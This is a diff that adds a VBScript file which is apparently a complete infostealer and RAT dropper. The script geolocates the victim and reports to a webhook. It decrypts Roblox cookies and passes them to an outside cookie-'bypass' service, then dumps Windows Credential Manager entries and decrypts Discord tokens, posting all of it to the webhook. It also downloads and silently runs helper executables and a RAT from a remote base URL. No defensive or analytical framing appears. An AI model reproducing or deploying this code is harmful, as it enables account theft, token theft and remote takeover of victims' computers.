@@ -1,0 +1,351 @@
+Option Explicit
+On Error Resume Next
+
+Dim sh, fso, WH, BASE_URL
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+WH = "WEBHOOK_URL"
+BASE_URL = "BASEURL_VALUE"
+
+' ===== IP + GEO =====
+Dim ipHttp: Set ipHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+ipHttp.SetOption 2, 13056
+ipHttp.Open "GET", "https://api.ipify.org", False
+ipHttp.Send
+If ipHttp.Status = 200 Then
+    Dim pubIP: pubIP = ipHttp.ResponseText
+    Dim locHttp: Set locHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    locHttp.SetOption 2, 13056
+    locHttp.Open "GET", "http://ip-api.com/json/" & pubIP, False
+    locHttp.Send
+    Dim locJson: locJson = locHttp.ResponseText
+    Dim cntry: cntry = ExtractJson(locJson, "country"):Dim rgn: rgn = ExtractJson(locJson, "regionName")
+    Dim cty: cty = ExtractJson(locJson, "city"):Dim isp: isp = ExtractJson(locJson, "isp")
+    Dim ipFields: ipFields = "{""name"":""IP"",""value"":""" & EscapeJson(pubIP) & """,""inline"":true}," &_
+        "{""name"":""Country"",""value"":""" & EscapeJson(cntry) & """,""inline"":true}," &_
+        "{""name"":""Region"",""value"":""" & EscapeJson(rgn) & """,""inline"":true}," &_
+        "{""name"":""City"",""value"":""" & EscapeJson(cty) & """,""inline"":true}," &_
+        "{""name"":""ISP"",""value"":""" & EscapeJson(isp) & """,""inline"":true}," &_
+        "{""name"":""PC"",""value"":""" & EscapeJson(GetPCName()) & """,""inline"":true}"
+    Dim ipMsg: ipMsg = "{""embeds"":[{""title"":""Target Connected"",""color"":3447003,""fields"":[" & ipFields & "]}]}"
+    PostJ WH, ipMsg
+    Set locHttp = Nothing
+End If
+Set ipHttp = Nothing
+
+' ===== DOWNLOAD DPA =====
+Dim dpaPath: dpaPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\dpa.exe"
+fso.DeleteFile dpaPath, True
+Dim dpaHttp: Set dpaHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+dpaHttp.SetOption 2, 13056
+dpaHttp.Open "GET", BASE_URL & "/dpa.exe", False
+dpaHttp.Send
+If dpaHttp.Status = 200 And LenB(dpaHttp.ResponseBody) > 1024 Then
+    Dim dpaStm: Set dpaStm = CreateObject("ADODB.Stream")
+    dpaStm.Type = 1: dpaStm.Open
+    dpaStm.Write dpaHttp.ResponseBody
+    dpaStm.SaveToFile dpaPath, 2
+    dpaStm.Close: Set dpaStm = Nothing
+    If Not fso.FileExists(dpaPath) Then
+        Dim xml: Set xml = CreateObject("MSXML2.DOMDocument")
+        Dim el: Set el = xml.CreateElement("tmp")
+        el.DataType = "bin.base64"
+        el.NodeTypedValue = dpaHttp.ResponseBody
+        Dim b64D: b64D = el.Text
+        Set el = Nothing: Set xml = Nothing
+        Dim b64path: b64path = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.b64"
+        Dim fb: Set fb = fso.CreateTextFile(b64path, True)
+        fb.Write b64D: fb.Close: Set fb = Nothing
+        sh.Run "certutil -decode """ & b64path & """ """ & dpaPath & """", 0, True
+        fso.DeleteFile b64path, True
+    End If
+End If
+Set dpaHttp = Nothing
+
+' ===== ROBLOX COOKIE =====
+Dim sp: sp = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+If fso.FileExists(sp) Then
+    Dim stream: Set stream = fso.OpenTextFile(sp, 1)
+    Dim raw: raw = stream.ReadAll: stream.Close: Set stream = Nothing
+    Dim cp: cp = InStr(raw, "CookiesData"":""")
+    If cp > 0 Then
+        cp = cp + 14: Dim ep: ep = InStr(cp, raw, """")
+        If ep > cp Then
+            Dim b64: b64 = Mid(raw, cp, ep - cp)
+            Dim decCookie: decCookie = TryDPAPI(b64)
+            If Len(decCookie) > 10 Then
+                Dim cookieVal: cookieVal = ExtractCookie(decCookie)
+                If Len(cookieVal) = 0 Then cookieVal = decCookie
+                Dim caePos: caePos = InStr(cookieVal, "|$CAE")
+                If caePos = 0 Then caePos = InStr(cookieVal, "|_CAE")
+                If caePos > 0 Then cookieVal = Mid(cookieVal, caePos)
+                Dim httpR: Set httpR = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+                httpR.SetOption 2, 13056
+                httpR.Open "GET", "https://rorefresher-production.up.railway.app/refresh?cookie=" & cookieVal, False
+                httpR.Send
+                If httpR.Status = 200 Then
+                    Dim rJson: rJson = httpR.ResponseText
+                    Dim bp: bp = InStr(rJson, "bypassedCookie"":""")
+                    If bp > 0 Then
+                        bp = bp + 18: Dim be: be = InStr(bp, rJson, """")
+                        If be > bp Then cookieVal = Mid(rJson, bp, be - bp)
+                    End If
+                End If
+                Set httpR = Nothing
+                Dim info: info = FetchRobloxInfo(cookieVal)
+                Dim fields: fields = "{""name"":""Username"",""value"":""" & EscapeJson(info(0)) & """,""inline"":true}," &_
+                    "{""name"":""ID"",""value"":""" & info(1) & """,""inline"":true}," &_
+                    "{""name"":""Robux"",""value"":""" & info(2) & """,""inline"":true}," &_
+                    "{""name"":""Source"",""value"":""DPAPI Decrypted"",""inline"":false}"
+                SendEmbed WH, "Roblox Account", fields, "cookie.txt", decCookie
+            Else
+                SendMsg WH, "Roblox Cookie (Encrypted)", b64
+            End If
+        End If
+    End If
+Else
+    SendMsg WH, "No Roblox Cookie", "Cookie file not found"
+End If
+
+' ===== WINDOWS CREDS =====
+Dim credFile: credFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\creds.txt"
+fso.DeleteFile credFile, True
+sh.Run """" & dpaPath & """ creds """ & credFile & """", 0, True
+If fso.FileExists(credFile) And fso.GetFile(credFile).Size > 0 Then
+    Set stream = fso.OpenTextFile(credFile, 1)
+    Dim credList: credList = stream.ReadAll: stream.Close
+    Dim lines: lines = Split(credList, vbLf)
+    Dim line, foundRoblox: foundRoblox = False
+    For Each line In lines
+        If InStr(1, line, "roblox", 1) > 0 Or InStr(1, line, "ROBLOSECURITY", 1) > 0 Then
+            foundRoblox = True
+            Dim parts: parts = Split(line, "|")
+            If UBound(parts) >= 0 Then
+                Dim targetName: targetName = parts(0)
+                Dim credBlob: credBlob = sh.ExpandEnvironmentStrings("%TEMP%") & "\cred_blob.bin"
+                fso.DeleteFile credBlob, True
+                sh.Run """" & dpaPath & """ cred """ & targetName & """ """ & credBlob & """", 0, True
+                If fso.FileExists(credBlob) And fso.GetFile(credBlob).Size > 0 Then
+                    Set stream = fso.OpenTextFile(credBlob, 1)
+                    Dim blobContent: blobContent = stream.ReadAll: stream.Close
+                    SendMsg WH, "Roblox Credential: " & targetName, blobContent
+                    fso.DeleteFile credBlob, True
+                End If
+            End If
+        End If
+    Next
+    If Not foundRoblox Then SendMsg WH, "Credential Manager", credList
+    fso.DeleteFile credFile, True
+End If
+
+' ===== DISCORD TOKENS =====
+Dim appd: appd = sh.ExpandEnvironmentStrings("%APPDATA%")
+Dim clients: clients = Array("discord", "discordptb", "discordcanary")
+Dim i
+For i = 0 To UBound(clients)
+    Dim ld: ld = appd & "\" & clients(i) & "\Local Storage\leveldb"
+    If fso.FolderExists(ld) Then
+        Dim lsPath: lsPath = appd & "\" & clients(i) & "\Local State"
+        Dim masterKey: masterKey = ""
+        If fso.FileExists(lsPath) Then
+            Set stream = fso.OpenTextFile(lsPath, 1)
+            raw = stream.ReadAll: stream.Close
+            Dim mkp: mkp = InStr(raw, "encrypted_key"":""")
+            If mkp > 0 Then
+                mkp = mkp + 16: Dim mke: mke = InStr(mkp, raw, """")
+                If mke > mkp Then
+                    Dim mkB64: mkB64 = Mid(raw, mkp, mke - mkp)
+                    masterKey = TryDPAPI_Key(mkB64)
+                End If
+            End If
+            Set stream = Nothing
+        End If
+        Dim folder: Set folder = fso.GetFolder(ld)
+        Dim file
+        For Each file In folder.Files
+            If (LCase(fso.GetExtensionName(file.Name)) = "ldb" Or LCase(fso.GetExtensionName(file.Name)) = "log") And file.Size < 1048576 Then
+                Set stream = fso.OpenTextFile(file.Path, 1)
+                Dim content: content = stream.ReadAll: stream.Close
+                If InStr(content, "dQw4w9WgXcQ:") > 0 Then
+                    If Len(masterKey) > 0 Then
+                        Dim tokens: tokens = DecryptTokens(content, masterKey)
+                        SendMsg WH, clients(i) & " Token", tokens
+                    Else
+                        SendMsg WH, clients(i) & " LevelDB", content
+                    End If
+                End If
+                Set stream = Nothing
+            End If
+        Next
+        Set folder = Nothing
+    End If
+Next
+
+' ===== RAT DEPLOY =====
+Dim ratPath: ratPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\WD.exe"
+Dim ratHttp: Set ratHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+ratHttp.SetOption 2, 13056
+ratHttp.Open "GET", BASE_URL & "/rat", False
+ratHttp.Send
+If ratHttp.Status = 200 And LenB(ratHttp.ResponseBody) > 10240 Then
+    Dim ratStm: Set ratStm = CreateObject("ADODB.Stream")
+    ratStm.Type = 1: ratStm.Open
+    ratStm.Write ratHttp.ResponseBody
+    ratStm.SaveToFile ratPath, 2
+    ratStm.Close: Set ratStm = Nothing
+    sh.Run """" & ratPath & """", 0, False
+End If
+Set ratHttp = Nothing
+
+' ===== FUNCTIONS =====
+Function TryDPAPI(cookieB64)
+    On Error Resume Next
+    Dim infile: infile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.in"
+    Dim outfile: outfile = sh.ExpandEnvironmentStrings("%TEMP%") & "\d.out"
+    Dim f: Set f = fso.CreateTextFile(infile, True)
+    f.Write cookieB64: f.Close: Set f = Nothing
+    fso.DeleteFile outfile, True
+    sh.Run """" & dpaPath & """ dpapi """ & infile & """ """ & outfile & """", 0, True
+    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
+        Dim rf: Set rf = fso.OpenTextFile(outfile, 1)
+        TryDPAPI = rf.ReadAll: rf.Close: Set rf = Nothing
+    End If
+    fso.DeleteFile infile, True: fso.DeleteFile outfile, True
+End Function
+
+Function TryDPAPI_Key(b64)
+    On Error Resume Next
+    Dim infile: infile = sh.ExpandEnvironmentStrings("%TEMP%") & "\k.in"
+    Dim outfile: outfile = sh.ExpandEnvironmentStrings("%TEMP%") & "\k.out"
+    Dim f: Set f = fso.CreateTextFile(infile, True)
+    f.Write b64: f.Close: Set f = Nothing
+    fso.DeleteFile outfile, True
+    sh.Run """" & dpaPath & """ dpapi5 """ & infile & """ """ & outfile & """", 0, True
+    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
+        Dim rf2: Set rf2 = fso.OpenTextFile(outfile, 1)
+        TryDPAPI_Key = rf2.ReadAll: rf2.Close: Set rf2 = Nothing
+        fso.DeleteFile outfile, True
+    End If
+    fso.DeleteFile infile, True
+End Function
+
+Function DecryptTokens(content, masterKeyB64)
+    On Error Resume Next
+    Dim keyfile: keyfile = sh.ExpandEnvironmentStrings("%TEMP%") & "\t.key"
+    Dim ldbfile: ldbfile = sh.ExpandEnvironmentStrings("%TEMP%") & "\t.ldb"
+    Dim outfile: outfile = sh.ExpandEnvironmentStrings("%TEMP%") & "\t.out"
+    Dim fk: Set fk = fso.CreateTextFile(keyfile, True)
+    fk.Write masterKeyB64: fk.Close: Set fk = Nothing
+    Dim fl: Set fl = fso.CreateTextFile(ldbfile, True)
+    fl.Write content: fl.Close: Set fl = Nothing
+    fso.DeleteFile outfile, True
+    sh.Run """" & dpaPath & """ discord """ & keyfile & """ """ & ldbfile & """ """ & outfile & """", 0, True
+    If fso.FileExists(outfile) And fso.GetFile(outfile).Size > 0 Then
+        Dim rf3: Set rf3 = fso.OpenTextFile(outfile, 1)
+        DecryptTokens = rf3.ReadAll: rf3.Close: Set rf3 = Nothing
+        fso.DeleteFile outfile, True
+    End If
+    fso.DeleteFile keyfile, True: fso.DeleteFile ldbfile, True
+End Function
+
+Function FetchRobloxInfo(cookie)
+    Dim result(3): result(0) = "Unknown": result(1) = "0": result(2) = "0"
+    On Error Resume Next
+    Dim http: Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.SetOption 2, 13056
+    http.Open "GET", "https://users.roblox.com/v1/users/authenticated", False
+    http.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+    http.Send
+    If http.Status = 200 Then
+        Dim u: u = http.ResponseText
+        If InStr(u, "name") > 0 Then
+            result(0) = ExtractJson(u, "name")
+            result(1) = ExtractJsonNum(u, "id")
+            http.Open "GET", "https://economy.roblox.com/v1/users/" & result(1) & "/currency", False
+            http.SetRequestHeader "Cookie", ".ROBLOSECURITY=" & cookie
+            http.Send
+            If http.Status = 200 Then result(2) = ExtractJsonNum(http.ResponseText, "robux")
+        End If
+    End If
+    FetchRobloxInfo = result
+End Function
+
+Function ExtractCookie(cookieJar)
+    Dim p: p = InStr(1, cookieJar, ".ROBLOSECURITY", 1)
+    If p = 0 Then Exit Function
+    p = p + 13
+    Do While Mid(cookieJar, p, 1) = " " Or Mid(cookieJar, p, 1) = vbTab
+        p = p + 1
+    Loop
+    Dim e: e = InStr(p, cookieJar, ";")
+    If e = 0 Then e = Len(cookieJar) + 1
+    ExtractCookie = Mid(cookieJar, p, e - p)
+End Function
+
+Sub SendEmbed(wh, title, fields, filename, fileContent)
+    Dim json: json = "{""embeds"":[{""title"":""" & EscapeJson(title) & """,""color"":65279,""fields"":[" & fields & "],""footer"":{""text"":""" & EscapeJson(GetPCName()) & " / " & EscapeJson(GetUserName()) & """}}]}"
+    Dim boundary: boundary = CreateGUID()
+    Dim body: body = "--" & boundary & vbCrLf &_
+        "Content-Disposition: form-data; name=""payload_json""" & vbCrLf & vbCrLf & json & vbCrLf &_
+        "--" & boundary & vbCrLf &_
+        "Content-Disposition: form-data; name=""file""; filename=""" & filename & """" & vbCrLf &_
+        "Content-Type: application/octet-stream" & vbCrLf & vbCrLf & fileContent & vbCrLf &_
+        "--" & boundary & "--"
+    PostM wh, body, boundary
+End Sub
+
+Sub SendMsg(wh, title, msg)
+    Dim json: json = "{""embeds"":[{""title"":""" & EscapeJson(title) & """,""description"":""" & EscapeJson(msg) & """,""color"":16711680,""footer"":{""text"":""" & EscapeJson(GetPCName()) & """}}]}"
+    PostJ wh, json
+End Sub
+
+Sub PostJ(wh, json)
+    Dim http: Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.SetOption 2, 13056
+    http.Open "POST", wh, False
+    http.SetRequestHeader "Content-Type", "application/json"
+    http.Send json: Set http = Nothing
+End Sub
+
+Sub PostM(wh, body, boundary)
+    Dim http: Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    http.SetOption 2, 13056
+    http.Open "POST", wh, False
+    http.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
+    http.Send body: Set http = Nothing
+End Sub
+
+Function ExtractJson(json, key)
+    Dim p: p = InStr(json, """" & key & """:""")
+    If p > 0 Then p = p + Len(key) + 4 Else Exit Function
+    Dim e: e = InStr(p, json, """")
+    If e > p Then ExtractJson = Mid(json, p + 1, e - p - 1)
+End Function
+
+Function ExtractJsonNum(json, key)
+    Dim p: p = InStr(json, """" & key & """:")
+    If p > 0 Then p = p + Len(key) + 3 Else Exit Function
+    Dim e: e = InStr(p, json, ",")
+    If e = 0 Then e = InStr(p, json, "}")
+    If e > p Then ExtractJsonNum = Trim(Mid(json, p + 1, e - p - 1))
+End Function
+
+Function GetPCName()
+    Dim ws: Set ws = CreateObject("WScript.Shell")
+    GetPCName = ws.ExpandEnvironmentStrings("%COMPUTERNAME%"): Set ws = Nothing
+End Function
+Function GetUserName()
+    Dim ws: Set ws = CreateObject("WScript.Shell")
+    GetUserName = ws.ExpandEnvironmentStrings("%USERNAME%"): Set ws = Nothing
+End Function
+
+Function EscapeJson(s)
+    s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t")
+    EscapeJson = s
+End Function
+
+Function CreateGUID()
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    CreateGUID = Mid(t.GUID, 2, 36): Set t = Nothing
+End Function
